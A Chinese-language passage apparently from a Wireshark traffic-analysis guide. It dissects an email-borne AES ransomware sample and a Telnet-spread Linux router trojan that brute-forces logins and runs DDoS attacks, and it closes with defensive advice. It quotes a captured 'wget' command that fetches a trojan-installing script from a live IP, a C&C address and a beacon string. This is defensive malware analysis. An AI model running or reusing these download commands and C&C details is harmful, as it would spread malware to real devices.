1)病毒文件一共是6个，其中红框中的3个文件是隐藏文件，js文件是引导用户打开的文件。为了防止杀毒软件查杀病毒，病毒文件首先是按照pe结构分开的，js命令把pe文件组合在一起，构成一个完成的bin文件。

![img](http://www.anquan.us/static/drops/full/fded70a69e63dbe7251156b4a647149a75de6514.jpg)

2)组合好的病毒文件会放到`c:\User\Username\Appdata\Local\temp`目录下，然后后台运行。如下图红色框中

![img](http://www.anquan.us/static/drops/full/cfb98ae3755fd5d528186d24d875fc1828b343ab.jpg)

在IDA中打开bin文件。大段大段的加密数据文件。如下图所示：

![img](http://www.anquan.us/static/drops/full/f3a656edaa1c2d5f454c59c85bcbe5772c0cff39.jpg)

**（二）病毒行为**

1)病毒解密还原后，才能正常执行。病毒文件经过了很多的亦或乘除等算法，通过VirtualAlloc在内存中存放一段代码，然后调用RtlDecompressBuffer进行解压，并在内存里还原代码。所有API函数都是动态调用的。下图是其中的一小部分还原数据的内容。

![img](http://www.anquan.us/static/drops/full/89999e0d0f2cdefdeb864d51a495b2423f564c84.jpg)

![img](http://www.anquan.us/static/drops/full/2daf198c24898ffc1ade9ce751061f225f575ad9.jpg)

![img](http://www.anquan.us/static/drops/full/0efb296be8aefea64422904601c98de70c36c250.jpg)

![img](http://www.anquan.us/static/drops/full/3dfe2e5e0918fd53876f287f5340d068a3c4f2cb.jpg)

2)在内存解密，申请分页，并拥有执行能力。

![img](http://www.anquan.us/static/drops/full/c0970a49dcbd88f75d71061900aba45187947425.jpg)

3)病毒会在HEKY_CURRENT_USER下创建一个属于用户的key值。

![img](http://www.anquan.us/static/drops/full/bff53115a38fb2735d8c902e3273a8e0236499ef.jpg)

![img](http://www.anquan.us/static/drops/full/b669df4432490018a021cae708bfe560c099a4ec.jpg)

![img](http://www.anquan.us/static/drops/full/56b3f54aa706f358c8f7435c398193a7acce27c8.jpg)

4)病毒会判断系统版本:从Win2000，xp 一直到最新的Win10以及Win Server 2016;

![img](http://www.anquan.us/static/drops/full/15162564dfe13513e8b8015281b6836628c03405.jpg)

![img](http://www.anquan.us/static/drops/full/501a5578252e03790a06dda9ec2255b35c96a477.jpg)

由于我们的虚拟机是win7；所以这里判断出是win7 zh代表中国。

![img](http://www.anquan.us/static/drops/full/6b5e429fa05d078be1d74c63b04e23cc2cf484c6.jpg)

病毒开始构造一个连接，准备发往作者的服务器。构造如下：

```
Id=00&act=00&affid=00&lang=00&corp=0&serv=00&os=00&sp=00&x64=00;
```

很明显这是在获取系统的一些信息，包括ID号，版本号，语言等。

![img](http://www.anquan.us/static/drops/full/05b754737859ed265fb4ade51089f6664bef3aa4.jpg)

病毒准备提交的网址：

![img](http://www.anquan.us/static/drops/full/b828d64b3a39bed4d8cb5098c58535723de449ed.jpg)

下面的IP地址；都要尝试连接一次。

![img](http://www.anquan.us/static/drops/full/4de023164a20af0f7c3fb9868da83ddd93701ae1.jpg)

通过wireshark截取的数据我们发现：有些IP地址的php网页已经丢失了。

![img](http://www.anquan.us/static/drops/full/346c179bb106c67ee6e8d88fc6269ead5b4acf18.jpg)

![img](http://www.anquan.us/static/drops/full/6cafd85daa4d62b794a2a354033a03eab26e50b5.jpg)

除此之外，病毒尝试连接部分c&c服务器网址，部分如下：

![img](http://www.anquan.us/static/drops/full/3046f4aa1479628f19f949452a9e248277e08b35.jpg)

5)如果病毒c&c服务器没有返回信息；则病毒一直处于等待状态。

6)感染文件。首先循环便遍历扫描文件。

![img](http://www.anquan.us/static/drops/full/09ec109e0df3a03899e8bae99a1e57b8a6acae90.jpg)

![img](http://www.anquan.us/static/drops/full/24a616b676c994f1e0b950289829fbba7bc70ed5.jpg)

下图是病毒要修改的文件格式：

![img](http://www.anquan.us/static/drops/full/8e5e915ba703f5b36683b2acdc812a29bc6ae1c8.jpg)

**文件名生成部分算法：**

文件名被修改过程分为两部分，前半部分代表`系统的key值`，后半部分通过算法生成。文件名改名加密算法的局部过程，从”0123456789ABCDEF”当中随机选取一个字符充当文件名的局部。随机函数采用`CryptGenRandom()`。

![img](http://www.anquan.us/static/drops/full/c2248abb92880336414716c7872e7ebc3e67ba9f.jpg)

文件内容加密总体流程：

![img](http://www.anquan.us/static/drops/full/0973c340acfd23b785d784d5495b9b4746c00a83.jpg)

首先文件以只读形式打开，防止其他文件访问其内容，接着通过AES-128算法加密器内容，最后置换文件。完成文件加密。

文件内容：经过AES-128位算法加密。

![img](http://www.anquan.us/static/drops/full/dfd9241a0415fe88d06c6f0a5fbd784d52303917.jpg)

打开文件

![img](http://www.anquan.us/static/drops/full/9f8076be919880ae9048996b2c8816c4ba57c75f.jpg)

把加密后的数据写回文件：

![img](http://www.anquan.us/static/drops/full/a454470622d04de2b676fd1bff098fa1797cf1ee.jpg)

然后通过API函数替换文件。

![img](http://www.anquan.us/static/drops/full/8841637d9ebf6c13f7a961e045254ffbe48c5d68.jpg)

8)桌面背景被换为：

![img](http://www.anquan.us/static/drops/full/8a7efd293b538412e9ed4fdc51e618efa1fb7803.jpg)

### 2.6.5 总结

------

1. 此类勒索邮件标题、正文、附件内容基本相同，只是针对收件人名称稍作修改。

2. 为躲避邮件过滤系统，发送者邮箱使用和伪造了大量不同的IP和邮箱地址。

   ![img](http://www.anquan.us/static/drops/full/38c558dbbeb1282b8b68d67a53805dd7b3227f7f.jpg)

3. 虽然此勒索病毒最终需要通过针对附件样本的分析才能判断确认，但基于流量分析可以发现诸多异常，完全可以在流量通信层面进行归纳阻断。

4. 随着大量比特币病毒流入国内，各种敲诈勒索行为日渐增多，对应这种病毒，我认为防范大于修复。因为比特币病毒对文件的加密算法部分相对复杂，还原的可能性较小。并且每台机器又不一致。所以，我们尽量做好预防才是根本。以下是几点需要我们提高警觉性的：（1）及时更新杀毒软件。（2）注意防范各种不明确的邮箱附件。（3）及时备份重要信息到其他存储介质。



## 2.7 针对路由器的Linux木马

### 2.7.1 前言

路由器木马，其主要目标是控制网络的核心路由设备；一旦攻击成功，其危害性远大于一台主机被控。

如果仅仅在路由器上面防范该类木马，那也是不够的，有很多Linux服务器违规开放Telnet端口，且使用了弱口令，一样可以中招。下面我们就一起来回顾一起真实案例。

### 2.7.2 发现异常

------

在对客户某服务器区域进行安全监测时发现某服务器通信流量存在大量Telnet协议。截取一段数据，进行协议统计：

![p1](http://www.anquan.us/static/drops/full/c0413a2adb383534d650aaba6d6afe2e4227a4ff.jpg)

Telnet协议一般为路由器管理协议，服务器中存在此协议可初步判断为异常流量。继续进行端口、IP走向统计：发现大量外部IP通过Tcp23端口（Telnet）连接该服务器。

![p2](http://www.anquan.us/static/drops/full/e33e2a8909b7acc35c85da0a15f745cc8ba84025.jpg)

此统计可说明：

1. 该服务器违规开放了TCP23端口；
2. 该服务器遭到大量Telnet攻击，有可能是暴力破解，也有可能是已经成功连接。

挑选通信量较大的IP，筛选通信双向数据：

![p3](http://www.anquan.us/static/drops/full/1a685ec74da3d4336ec2e66a25b9cb31dcda26e4.jpg)

查看Telnet数据，发现已经成功连接该服务器。

![p4](http://www.anquan.us/static/drops/full/55850beb1dfb12c10c9680cbd380714582d718b2.jpg)

数据中还存在大量Telnet扫描探测、暴力破解攻击，在此不再详述。

### 2.7.3 获取样本

------

为进一步查看Telnet通信内容，Follow TcpStream。

![p5](http://www.anquan.us/static/drops/full/29c795c3fed6ea1e7b0911e9d5229945e718fadc.jpg)

将内容复制粘贴至文本编辑器：

![p6](http://www.anquan.us/static/drops/full/941c3adc17461f7798a6caf00ddf6c4fcd1870f5.jpg)

发现一段自动下载命令：

```
wget http://208.67.1.42/bin.sh;
wget1 http://208.67.1.42/bin2.sh。
```

连接`http://208.67.1.42/bin.sh`可发现该脚本文件内容为自动下载获取木马，且木马可感染ARM、MIPS、X86、PowerPC等架构的设备。

![p7](http://www.anquan.us/static/drops/full/71359a7bc5ee5d93f0922cf35a5491e08dba0a36.jpg)

### 2.7.4 木马分析

------

（**注：本章节不属于Wireshark分析范畴，本文仅以jackmyx86分析为例**）

该木马文件是ELF格式的，影响的操作系统包括：

![p8](http://www.anquan.us/static/drops/full/7bd84ff150b406226c1a846777628a75b8021b24.jpg)

从上图中判断木马下载的类型分别是：Mipsel,misp,x86(其实这个是x64),arm,x86(i586,i686)等。

从截获的`*.sh`文件看，`*.sh`脚本想删除这些目录和内容，并且关闭一些进程。

![p9](http://www.anquan.us/static/drops/full/5d6ca5e9300b1f0a0d3b3ab20459cf1416342ca4.jpg)

首先得到了一个”Art of war”的字符串（看来黑客是个文艺青年）。

![p10](http://www.anquan.us/static/drops/full/502eca9327df35b2e172b9ba9b76c84c88445625.jpg)

接着尝试打开路由器配置文件。

![p11](http://www.anquan.us/static/drops/full/f8c4e08067cfdb6a5b8be0284531e58264b2e781.jpg)

在配置文件里查找字符串00000000，如果找到就直接填充0；

![p12](http://www.anquan.us/static/drops/full/c3b1e8eb784acff3e912dfe31ddfefb6d5da8f11.jpg)

在初始化函数中：尝试建立socket连接，连接地址为：208.67.1.194:164。

![p13](http://www.anquan.us/static/drops/full/17eb1b39980580fecd61452a32a7938ce5ad0056.jpg)

尝试连接服务器，等待远端服务器应答。

![p14](http://www.anquan.us/static/drops/full/c040837f1fa9bb2d8cbb1dc9b37977e15eceb7fc.jpg)

服务器发送“ping”命令后，客户端返回“pong”表示已经连接成功。当发送“GETLOCALIP”后，返回控制端的本机IP。当服务器发送SCANNER后，根据ON或者OFF来控制是否要扫描指定IP，进行暴力破解。当发送“UDP”命令时候，向指定的IP地址发送大量UDP无效数据包。

![p15](http://www.anquan.us/static/drops/full/e2b176b908e29706954d67480a11050feb100e06.jpg)

![p16](http://www.anquan.us/static/drops/full/d722f86a2e2b4bdefc1664cdc2365fa2410be7cb.jpg)

![p17](http://www.anquan.us/static/drops/full/cbaa10c15543be2ebd4fe9403e56a90d2c3a37ff.jpg)

下图是木马尝试获得路由器的用户名和密码匹配，企图暴力破解账户和密码。

![p18](http://www.anquan.us/static/drops/full/51a46d9d3f187df67493f8e8d60e45e9cfbaa8ab.jpg)

![p19](http://www.anquan.us/static/drops/full/de63c2e21310ba1a78e7f33ed5197ba309a2f462.jpg)

![p20](http://www.anquan.us/static/drops/full/e782599233ab756d67398c5f8bf61efc0d45025b.jpg)

在被控制之后，跟随服务器指定的IP，发送大量随机生成的长度为0x400的字符串数据，进行DDOS攻击。下图是发送垃圾数据,进行DDOS攻击。

![p21](http://www.anquan.us/static/drops/full/da085ba07ec40ececfa5abc66779b09950b7eb72.jpg)

![p22](http://www.anquan.us/static/drops/full/67cc1bcd6af7b30f347d5399b450193bc02abaf5.jpg)

随机数据生成的伪代码如下：

![p23](http://www.anquan.us/static/drops/full/6821d6d6f28502ed3814c116a7f3e582462c974d.jpg)

根据网址追溯到攻击者的网页和twitter账号。

![p24](http://www.anquan.us/static/drops/full/c5ddb63b001e53d5f7346dcc3542672dcc56db96.jpg)

![p25](http://www.anquan.us/static/drops/full/360a24d3123d1e54d034082b9d1ca8e1eec56072.jpg)

![p26](http://www.anquan.us/static/drops/full/6de3abb27fdb8a7375622bed17e3265b9133e0d9.jpg)

### 2.7.5 总结

------

1. 路由器的管理如非必须，尽量不开放互联网管理通道
2. 路由器管理密码必须强口令、最好超强
3. Linux服务器一般不要打开Telnet服务
4. 该木马一般利用爆破和漏洞来攻击路由器或开启Telnet服务的Linux服务器，中招后接受木马作者的控制，最后进行大量DDOS攻击



转自：

[乌云](http://www.anquan.us/search?keywords=wireshark&content_search_by=by_drops)

Wireshark数据包分析实战

















